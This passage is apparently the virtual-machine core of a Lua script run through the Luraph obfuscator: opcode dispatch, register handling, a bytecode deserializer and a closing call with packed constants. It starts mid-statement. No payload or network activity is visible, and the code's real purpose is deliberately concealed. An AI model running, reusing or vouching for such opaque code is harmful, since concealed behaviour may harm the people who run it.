s=q(B,U);break;end;else F=4;r=0X69;end;end;else P=nil;q=(nil);N=(7);local r=e;while true do if N<0x1.44P6 and N>7.0 then r=(r[P]);P=e;N=(81);elseif N<0X1.Dp5 then N=(58);P=7;elseif not(N>0X1.Dp5)then else q=0X4;break;end;end;P=P[q];s=r>>P;end;r=3+((r<<e[0x5]>>e[0x05])-F==r and F or r);end;end;end;end;else if F>=0X16 then if F==0X17 then a[O]=({[2]=z,[0X4]=y,[5]=E});local r=e[5];O=O+1;y=G[r+2]+0X0;E=G[r+1]+0X0;z=(G[r]-y);s=(e[0X3]);else G[e[0X5]]=G[e[0X2]]%e[0X04];end;else G[e[0X5]]=G[e[3]]&G[e[2]];end;end;end;end;elseif F>=0X24 then if not(F>=42)then if F>=0X27 then if F<40 then G[e[0X2]]=G[e[0X3]]+e[6];else if F==0X29 then(G)[e[0x5]]=e[7]~e[0x4];else if not G[e[0X3]]then s=(e[0X2]);end;end;end;else if F<37 then if G[e[3]]~=G[e[0X5]]then s=e[2];end;else if F==38 then local r=(e[0X3]);local B=O-r;r=a[B];for r=B,O do(a)[r]=nil;end;z=r[0X2];E=r[0X5];y=(r[0X4]);O=B;else(a)[O]=({[2]=z,[4]=y,[0X5]=E});O=(O+0x1);j=(e[0X2]);z=(G[j]);E=G[j+1];y=G[j+2];s=(e[0X3]);end;end;end;else if F<0X2D then if F>=43 then if F==0X2c then local r=(e[2]);(G)[r]=G[r](G[r+0X1],G[r+2]);j=(r);else G[e[0X2]]=G[e[0X5]]%G[e[0X3]];end;else G[e[5]]=G[e[0X2]]/G[e[3]];end;else if not(F<0X2f)then if F~=0X30 then local r=(false);z=z+y;if y<=0x0 then r=z>=E;else r=z<=E;end;if not r then else s=e[5];G[e[2]+3]=z;end;else(G)[e[2]]=(G[e[0X5]]>e[4]);end;else if F==46 then local r,B,q,U,s,P=78,(F);while true do if r==0X1.38P6 then q=e;U=(0X1);r=0X7+((r|e[0X5])>>e[0X5]<<e[5]~r);elseif r~=85.0 then else P=41;break;end;end;local N;r=26;while true do if not(r>0X1.ap4)then if r==26.0 then N=(e);r=0x23+(((e[5]<r and F or F)+r>F and r or r)-e[5]);else B=B+N;N=(e);s=0x5;break;end;else if r==92.0 then N=N[s];r=(-235+((r+r~e[5]~F)+r));else s=(5);r=144+(((r~F)-F~e[0X5])-r);end;end;end;r=1;while true do if r<0X1.6cP6 and r>0X1.0p0 then N=(N[s]);break;elseif r>0x1.14P6 and r<0x1.bP6 then N=(e);r=(35+(((F~=r and F or r)-e[0x5]&e[5])+r));else if r<0X1.14p6 then N=N[s];r=(0x3E+((r-r>=r and r or e[0X5])&r<=e[5]and F or e[0X5]));elseif r<0X1.F8p6 and r>0x1.6cp6 then B=B<<N;r=91+((F<<e[5]|e[5]~=F and e[5]or e[0X5])>>e[5]);elseif not(r>108.0)then else s=0x1;r=-57+(((F|r)<<e[5]|r)>>e[0X5]);end;end;end;r=(102);while true do if r==102.0 then B=B==N;r=-188403+(((e[0X5]|e[5])+F==r and e[0X5]or F)<<e[0X5]);elseif r==13.0 then if B then local r,q,F=0X3D;while true do if r<120.0 then q=e;r=(0X78);F=(0X5);elseif not(r>0x1.e8p5)then else B=(q[F]);break;end;end;end;r=(0X8+(((r==e[0X5]and r or F)~e[5]>F and e[0x5]or F)-F));elseif r~=0X1.0P3 then else if not B then B=(F);end;break;end;end;N=(F);B=(B<=N);r=(72);while true do if r==72.0 then if B then local r,q;for F=66,155,89 do if F<0X1.36P7 then r=e;q=5;elseif F>66.0 then B=(r[q]);end;end;end;r=-188409+(((e[0X5]<F and r or r)~F>=r and F or e[0X5])<<e[5]);elseif r==0X1.cp2 then if not B then local r,q,F=(0X6E);while true do if r>110.0 then F=0X1;B=q[F];break;elseif not(r<117.0)then else q=(e);r=(0X75);end;end;end;r=(46+((r>>e[0X5]|F>=F and e[0x5]or r)==F and F or e[5]));elseif r~=0x1.DP5 then if r~=0X1.44p6 then if r==0x1.fP6 then N=(N[s]);r=-131+(((r>=e[5]and F or r)&F)+r|e[0x5]);elseif r~=43.0 then else B=B>>N;break;end;else s=0X5;r=(-49028+(((r-r~e[5])&F)<<e[5]));end;else N=(e);r=(0X23+(F>>e[0x5]&e[0x5]&r<r and F or F));end;end;r=18;while true do if not(r<=0X1.4P4)then if not(r>0X1.24P6)then s=0X1;r=(0X8+((F<=e[0X5]and F or e[0X5])~r|e[5]==F and e[5]or e[0X5]));else if r>99.0 then s=(0X1);r=(0Xd+(((r&e[0x5])-F<=F and F or e[5])-F));else B=(B+N);N=(e);r=3+((F<<e[5]<<e[5]>e[0X005]and r or e[0X5])&r);end;end;else if r>13.0 then if r==20.0 then N=N[s];r=-0x1b+((F+F|e[0X5])-e[5]+F);else N=e;r=0x37+(r+r-r>>e[0X5]<F and r or r);end;else N=N[s];break;end;end;end;r=(0x2c);while true do if r==44.0 then B=B-N;N=e;s=0X5;r=(-19+(((F~r)>>e[5]==F and r or F)==F and F or r));elseif r==27.0 then N=N[s];break;end;end;r=(0x5);while true do if r==0X1.4P2 then B=(B&N);P=(P+B);r=(-0X2+(((e[0x5]~F)>>e[5])+F~e[0x5]));elseif r==0x1.0p5 then q[U]=(P);q=(G);r=(0X52+((r-F>=F and e[0x5]or r)<<e[0X5]&r));elseif r==0X1.48p6 then U=e;r=(-0X49+((e[5]>>e[0X5]~e[0X5]|r)-e[5]));elseif r~=0x1.2p3 then if r==0x1.5P6 then U=(U[P]);break;end;else P=(5);r=(0X57+(((e[5]>>e[0X5])+r==F and r or r)-e[0x5]));end;end;P=true;if not P then local r,B,q,F,U=7,(0X34);for r=0X2d,148,69 do if r<114.0 then q=(C);elseif not(r>0X1.68P5)then else F=e;break;end;end;while true do if not(B<=0x1.8p1)then if B~=6.0 then F=F[r];B=3;else r=r[U];P=q(F,r);break;end;else r=e;U=0x4;B=6;end;end;else r=nil;N=(nil);B=(96);s=nil;while true do if B<=63.0 then if not(B<63.0)then B=18;N=7;else B=0X49;r=(r[N]);end;else if B~=0X1.24p6 then B=(0X3F);r=e;else N=e;s=0X4;N=(N[s]);break;end;end;end;P=r~N;end;(q)[U]=(P);else local r=(e[0X3]);(G[r])(G[r+1],G[r+0x2]);j=r-0X1;end;end;end;end;else if not(F>=30)then if not(F<27)then if not(F>=28)then(G)[e[0X2]]=G[e[3]]<G[e[5]];else if F==0X1D then(G)[e[5]]=(e[7]>>e[0X4]);else repeat for r,B in K,W do if not(r>=1)then else B[2]={G[r]};(B)[1]=1;W[r]=(nil);end;end;until true;return false,e[5],j;end;end;else if F<25 then G[e[3]]=(G[e[0X5]]|G[e[0X2]]);else if F==0X1A then local r=e[0X5];j=r+e[0x2]-1;G[r](n(G,r+0x1,j));j=r-0X1;else local r=(q[e[5]]);G[e[3]]=r[0x2][r[1]][e[0X7]];end;end;end;else if not(F>=33)then if F>=31 then if F==32 then if not(e[7]<G[e[0X3]])then s=e[0x5];end;else j=(e[2]);G[j]=G[j]();end;else(G[e[5]])[e[0X4]]=(G[e[0X2]]);end;else if not(F>=34)then(G)[e[0X5]]=G[e[0X2]]~=G[e[0X3]];else if F~=35 then G[e[5]]=(nil);else if not not(G[e[5]]<=G[e[0X2]])then else s=e[0x3];end;end;end;end;end;end;else if not(F<73)then if not(F>=85)then if not(F>=79)then if F<76 then if F>=0x4a then if F~=0X4B then local r=(q[e[2]]);r[2][r[1]]=G[e[0X5]];else G[e[2]]=(e[0X4]^G[e[5]]);end;else local r=e[0X5];G[r](n(G,r+0X1,j));j=(r-0x1);end;else if not(F<77)then if F~=78 then(G)[e[0X5]]=(G[e[2]]==G[e[3]]);else repeat for r,B in K,W do if not(r>=0X1)then else(B)[0X2]={G[r]};(B)[1]=1;(W)[r]=(nil);end;end;until true;return;end;else local r=e[0X3];(G[r])(G[r+1]);j=r-1;end;end;else if not(F>=82)then if not(F>=80)then(G)[e[2]]=(m[e[0X5]]);else if F==0X51 then local r=(q[e[5]]);(r[0X2][r[1]])[G[e[3]]]=(G[e[0X2]]);else o=e[3];for r=1,o do(G)[r]=N[r];end;B=(o+0x1);end;end;else if F<83 then(G)[e[2]]=G[e[3]]^G[e[0X5]];else if F~=84 then G[e[0x2]]=H(e[3]);else(G)[e[0X5]]=G[e[0X2]]+G[e[3]];end;end;end;end;else if F<0X5B then if not(F<0X58)then if F>=89 then if F==0x5A then m[e[0X005]]=G[e[0X2]];else repeat for r,B in K,W do if r>=0X1 then B[0X02]=({G[r]});B[1]=0X1;(W)[r]=(nil);end;end;until true;return true,e[0X5],0X1;end;else local r,B=e[5],e[0X3]*100;local q=G[r];(P)(G,r+0x1,j,B+1,q);end;else if F>=86 then if F==87 then(G[e[0X5]])[G[e[0X2]]]=e[4];else G[e[3]]=G[e[2]]<<G[e[0x5]];end;else repeat for r,B in K,W do if r>=0X1 then(B)[2]={G[r]};B[0X1]=0X01;(W)[r]=(nil);end;end;until true;local r=(e[3]);return false,r,r+e[0X005]-0X2;end;end;else if not(F>=0X5e)then if not(F>=0X5c)then local r=(e[5]);G[r]=G[r](G[r+1]);j=r;else if F~=0X5d then G[e[0X3]]=G[e[0X5]]>>e[7];else local r=e[3];G[r]=G[r](n(G,r+1,j));j=r;end;end;else if not(F<96)then if F~=97 then G[e[2]]=G[e[3]]*G[e[0X5]];else G[e[3]]=G[e[0X5]]|e[7];end;else if F==95 then repeat for r,B in K,W do if r>=1 then B[0X2]=({G[r]});(B)[1]=(1);W[r]=(nil);end;end;until true;return true,e[3],0;else(G)[e[0x5]]=not G[e[2]];end;end;end;end;end;elseif not(F<0X3d)then if not(F<67)then if F>=0X46 then if F>=0x47 then if F==0X48 then G[e[3]]=G[e[2]]~G[e[0X5]];else repeat for r,B in K,W do if not(r>=0X1)then else(B)[2]={G[r]};B[0X1]=0X001;(W)[r]=(nil);end;end;until true;local r=(e[0X2]);return false,r,r;end;else local r=e[2];local B,q=z(E,y);if not B then else G[r+0X1]=(B);(G)[r+0X2]=q;s=(e[3]);y=(B);end;end;else if F>=68 then if F==69 then local B=e[6];local F=B[5];local U,s=(#F);if U>0X0 then s={};for r=1,U do local B=F[r];local F=(B[2]);local U=(B[0X1]);if F~=0 then s[r-0X1]=q[U];else B=(W[U]);if not B then B=({[0x1]=U,[2]=G});(W)[U]=(B);end;(s)[r-1]=(B);end;end;end;F=r(B,s);G[e[3]]=(F);else local r=e[0x005];j=(r+e[0x3]-0x1);(G)[r]=G[r](n(G,r+0X1,j));j=(r);end;else for r=0X1,e[3]do(G)[r]=N[r];end;end;end;else if F<0X40 then if F>=62 then if F==63 then s=(e[0X05]);else(G)[e[0X5]]=G[e[0X2]][e[4]];end;else(G)[e[2]]=G[e[0x5]]==e[0X4];end;else if not(F<65)then if F~=66 then G[e[3]]=(G[e[0X2]]..G[e[0X5]]);else local r,B,q,U,s,P=2,(0x63);while true do if B>0x1.Ap3 and B<0X1.98P6 then s=(e);B=0XF+((F-e[5]|F~=F and B or F)-e[0x2]);elseif B<99.0 then U=48;break;elseif not(B>99.0)then else q=(1);B=(-0X00bf+(((e[0X5]<B and B or e[5])<<e[0X2]>=F and B or F)+B));end;end;local N;B=(0x75);while true do if B>0x1.4P6 and B<0X1.d4p6 then N=(N[P]);B=(0x2+(((F>=e[0X5]and e[0X2]or e[0X5])==F and e[2]or B)+e[5]>>e[0X2]));else if not(B>111.0)then if B<0x1.4P6 then P=e;break;else if not(B>0X1.0p1 and B<111.0)then else P=(5);B=(0X63+(e[2]~e[2]~e[0X2]~F~=e[5]and e[0X2]or e[0X5]));end;end;else N=e;B=14+(((B>=e[2]and F or B)~e[0X2])-F>B and B or F);end;end;end;P=(P[r]);B=0x37;while true do if B==0x1.b8p5 then N=N>>P;B=42+((B~e[5]<=e[5]and F or e[2])>>e[2]&e[0X5]);elseif B==0X1.5p5 then P=e;break;end;end;r=0X2;B=(0X2b);while true do if B==14.0 then P=(e);break;else P=P[r];N=(N-P);B=-270388+(((e[0X5]~e[2]~=B and F or B)<<e[5])+F);end;end;r=2;B=(47);while true do if B~=0x1.08p6 then P=(P[r]);B=(132+(((B|B)>>e[0X2]<<e[0x2])-F));else N=N-P;P=(F);break;end;end;N=(N|P);P=e;r=(0X2);B=(0X3d);while true do if B<=61.0 then P=(P[r]);B=(0X3b+((e[2]>>e[0X5]<=F and e[5]or e[5])>>e[0X5]<=F and B or F));else if B>119.0 then N=N-P;P=e;B=(65+((F-e[0X2]<<e[0X5])+e[5]>>e[0x2]));else r=(5);P=P[r];break;end;end;end;N=N|P;B=73;while true do if B==73.0 then P=e;B=(8+((F-e[0X2]+e[0x5]==F and F or F)==e[0x005]and B or e[2]));elseif B==20.0 then r=5;break;end;end;P=(P[r]);B=97;while true do if B==0x1.84p6 then N=(N&P);P=e;B=-2+(((e[0X2]<e[5]and F or F)-F|e[5])~F);else if B~=76.0 then else r=(0X2);break;end;end;end;B=(0X3f);while true do if B>20.0 and B<0x1.24p6 then P=P[r];B=(-57+(((e[0x5]|e[0X2]|F)~F)+B));elseif B<20.0 then N=(N>>P);B=(-0X5+((e[2]<<B~e[0X5]~=F and e[5]or e[2])~F));elseif B>0X1.F8P5 then U=(U+N);B=(0XE014+((F-B~B|F)<<e[0x5]));elseif not(B>18.0 and B<0X1.F8P5)then else s[q]=(U);break;end;end;s=(G);q=(e);U=2;B=111;while true do if not(B>2.0)then if B<0x1.bCP6 then N=e;break;end;else q=q[U];U=(G);B=(-4503599627370493+(((B>>e[2])-e[5]~e[2])>>e[2]));end;end;B=(45);while true do if B~=0X1.68p5 then N=(N[P]);break;else P=(5);B=(-26+((e[0X5]|e[0X2])-e[2]|F~=e[0X5]and F or F));end;end;U=U[N];B=53;while true do if B>0x1.0p4 then if not(B<=47.0)then N=(e);B=12+((e[0X5]<<e[0X005]<=B and F or e[0X2])&B&B);else N=(N[P]);break;end;else P=4;B=46+((B<<e[2]>>B)+e[5]-e[5]);end;end;U=(U>N);(s)[q]=(U);end;else G[e[0X5]]=(G[e[3]]*e[0X7]);end;end;end;else if not(F>=55)then if F>=0X34 then if F<53 then(G)[e[5]]=G[e[0X3]]>=G[e[2]];else if F==54 then else for r=e[2],e[3]do(G)[r]=nil;end;end;end;else if not(F>=0x32)then G[e[2]]=(G[e[0X5]]-G[e[0X3]]);else if F~=51 then local r,q,F=e[0X3],U-o-1,0x0;if not(q<0)then else q=(-1);end;for r=r,r+q do G[r]=N[B+F];F=(F+0X1);end;j=(r+q);else(G)[e[2]]=G[e[3]]<e[6];end;end;end;else if not(F>=0X3a)then if F<56 then(G[e[0X3]])[e[6]]=(e[0X7]);else if F~=0X39 then(G)[e[2]]=-G[e[0X5]];else if G[e[0X3]]then s=e[0X2];end;end;end;else if F<0x3B then(G)[e[5]]=(#G[e[2]]);else if F==0X3c then G[e[5]]={};else(G[e[3]])[G[e[0X05]]]=(G[e[2]]);end;end;end;end;end;end;until false;end);if _ then if D then if Q~=0X1 then return G[h](n(G,h+0x1,j));else return G[h]();end;else if h then return n(G,h,Q);end;end;else repeat for r,B in K,W do if r>=1 then B[0X2]={G[r]};(B)[0X1]=1;(W)[r]=(nil);end;end;until true;if b(D)=='\x73tr\105\110g'then if not x(D,':(%\z\100+)\z\91:\13\x0A]')then l(D,0);else l("Lu\114\za\x70\104 S\u{063}r\z \x69\z p\u{074}\58"..(e[s-1]or"\u{28}internal)")..'\u{003A} '..u(D),0X0);end;else l(D,0);end;end;end;return s;end;local P,x;z=(nil);i=(0x0036);while true do if i==54.0 then P=(D);x=(nil);if not Y[0X7cD1]then(Y)[4092]=28+(((Y[26403]+Y[27326]>Y[0X6103]and Y[27326]or Y[0X00534d])>Y[7658]and t[1]or Y[0X68A0])<=Y[23624]and Y[16180]or Y[0X00610b]);Y[11051]=(37+(((Y[0x7e02]>t[3]and t[4]or Y[1372])~Y[0X3bBD])-Y[0X0037F]>>Y[1051]));i=(0X6+((Y[0X1c09]~t[9]~=Y[0X4Fb1]and Y[24843]or Y[0x1286])-Y[86]>=Y[0X42eE]and Y[16180]or Y[21255]));Y[31953]=(i);else i=(Y[0X7CD1]);end;else if i==29.0 then z=function(...)return(...)[...];end;if not Y[18062]then Y[0X1c95]=(0X01A+((t[0x005]~=Y[0X5307]and Y[7658]or Y[16180])+t[1]>>Y[1372]~Y[0x4F7]));i=(108+(((Y[0x5C48]~Y[0X6213])&Y[0X74ba]<=Y[31463]and t[6]or Y[30164])-Y[0X1DeA]));(Y)[0X468e]=(i);else i=Y[18062];end;else if i~=88.0 then else x=function()local r;goto r;::s::;r=({D,{},{},D,nil});(r)[4]=g();goto e;::r::;goto s;::e::;(r)[0x1]=g();local B,q,F,U=0X00e;repeat if B>21.0 then B=(15);U=(r[N]);else if B<0X1.5P4 and B>14.0 then for r=1,F do local B,q,F,e;B,q,F,e=o(),o(),o(),o();U[r]={[0X1]=D,[4]=D,[2]=D,[5]=q>>0X2,[0X7]=D,[0X2]=D,[0x004]=F&3,[7]=D,[0X6]=q&N,[1]=e,[2]=B>>0X2,[3]=F>>j,[0x7]=B&0x3};end;break;elseif B<15.0 then B=(0x0015);q=a;else if B>0X1.Ep3 and B<0X1.CP6 then B=0X70;F=(g()-45157);end;end;end;until false;local B=({});for B=0X1,F do local q=(r[0X3][B]);for r,B in K,J do local F,e=M[B],q[B];U=q[F];if U==0X2 then local r,B;goto N;::G::;if not B then else local r,U=19;repeat if r==0x1.3P4 then q[F]=(B[0X1]);r=0X56;else if r~=0X1.58p6 then else U=B[j];break;end;end;until false;(U)[#U+0X1]={q,F};end;goto P;::N::;r=T[e];B=(L[r]);goto G;::P::;elseif U==a then q[B]=(e+0x1);else if U~=0X0 then else r=(P[e]);if not r then for B=0X2D,0XcE,0X58 do if B==0X1.0aP7 then P[e]=r;break;else r=({});end;end;end;r[#r+0X1]=({q,F});end;end;end;end;local F=r[0X2];goto U;::F::;r[5]=B;for r=0X1,g()do local q;goto W;::N::;B[r]={[j]=q&1,[1]=q//j};goto O;::K::;goto G;::P::;q=g();goto N;::G::;goto P;::W::;goto K;::O::;end;goto q;::B::;for r=1,W()do local r;goto G;::P::;if r&a~=_ then q=W();local B=W();for r=r>>0X1,q do(F)[r]=B;end;else F[q]=(r>>a);end;goto N;::G::;r=W();goto P;::N::;q=q+1;end;goto F;::q::;do return r;end;::U::;goto B;end;break;end;end;end;end;B=nil;B=(function()T=({});L={};P={};local r,B,q,F,U=113;repeat if r>28.0 then if r==0x1.C4P6 then r=0X1C;B=(g()-e);q=(a);else U=X()~=0X0;break;end;else F={};r=75;end;until false;local e,G;r=(60);repeat if r==0x1.eP5 then for r=0X1,B do local B,F=(D);goto q;::B::;F=X();if F==140 then B=h();elseif F==158 then B=A();elseif F==25 then B=s(h(),W());elseif F==0x7b then B=k();elseif F==0X0a1 then B=X()==0x1;elseif F==0xa4 then B=W();end;goto r;::F::;goto B;::q::;goto F;::r::;local F=({B,{}});T[r-1]=q;L[q]=F;q=q+1;if U then r=(68);while true do if r<83.0 then v[V]=(F);r=0X53;elseif not(r>0X1.1p6)then else V=V+0X1;break;end;end;end;end;r=(0X6B);e=g()-E;elseif r==107.0 then for r=0,e-0X1 do F[r]=x();end;r=0X4e;elseif r==78.0 then r=85;for r,B in K,P do local q;for U=0X01b,0x88,109 do if U==27.0 then q=(F[r]);else if q then for r,r in K,B do r[1][r[0x2]]=q;end;end;end;end;end;elseif r==85.0 then G=(F[g()]);r=(48);else if r~=0X1.8P5 then if r==0X1.3CP6 then r=(98);L=D;elseif r==0X1.88P6 then r=(0x59);P=(D);elseif r~=89.0 then else return G;end;else r=0X4f;T=nil;end;end;until false;end);y=(nil);local e;i=(0X26);while true do if not(i<=0x1.3P5)then S[0X000]=({[a]=a,[2]=p({},{[O]=function(r,r,r)_ENV=r;end,[U]=function(r,r)return _ENV;end})});break;else y=(function(...)return(...)();end);e=B();if not Y[17648]then(Y)[0X138F]=(-8506+(((t[0X8]+Y[1271]|t[6])&t[1])+Y[895]));Y[27554]=(-661027938+((Y[26403]-Y[0x4f7]&Y[21255]~t[2])-Y[0X5C48]));i=(-1113438709283291059+(((Y[0X49F8]|t[3])<<Y[895]|Y[0X2226])<<Y[21255]));Y[17648]=(i);else i=(Y[0x44F0]);end;end;end;O=(nil);i=(107);repeat if i<0x1.acp6 and i>0x1.38p6 then e=r(e,S)(B,Q,z,y,k,X,W,t,G,r);if not Y[0x7033]then i=0X4+((Y[4742]~=Y[0x482D]and Y[0X6213]or t[0x4])>>Y[18477]&Y[0X2b2b]>Y[23624]and t[0X6]or Y[0X12E9]);(Y)[28723]=(i);else i=Y[0X7033];end;else if not(i<0X1.38p6)then if i>0x1.54P6 then O=function(r)for B=0x6e,0Xde,53 do if B==110 then if b(r)=="table"then local B,q=108;while true do if not(B<108.0)then if B>91.0 then q=p({},{[U]=r});for r,B in K,r do(q)[r]=(B);end;B=0x5B;end;else return q;end;end;end;else if B==0xA3 then return r;end;end;end;end;if not not Y[0X7699]then i=Y[0X7699];else i=(36+(((Y[0X534D]&Y[30164])<<Y[0x3b1A]&Y[0X7CD1])+Y[0XbA8]));Y[0X7699]=(i);end;else if not(i<85.0 and i>0X1.8p5)then else m[F]=O(Z);(m)[0X721]=O(q.r);if not Y[28452]then i=0X20+(Y[895]-Y[0X41B]<<Y[0X482d]<<Y[0X534D]~=Y[29882]and Y[9593]or Y[18477]);(Y)[28452]=i;else i=Y[28452];end;end;end;else return r(e,S);end;end;until false;end)(select,4,{B=string.char,n=string.unpack,A=table.unpack,U=setmetatable,r=math},2950,'__\105nde\120',77435,string.sub,5,table.move,0X3,'\z \x5F_ne\119i\z  n\100\101x',next,string.gsub,0X2,string.byte,7,string.match,1,string,0X7640,9,0,tostring,nil,string.unpack,function(...)(...)[...]=(nil);end,{},{45936,661027992,4147882417,3692592832,3242010885,825314772,0X4eD8F74d,459745630,271218552})(...);
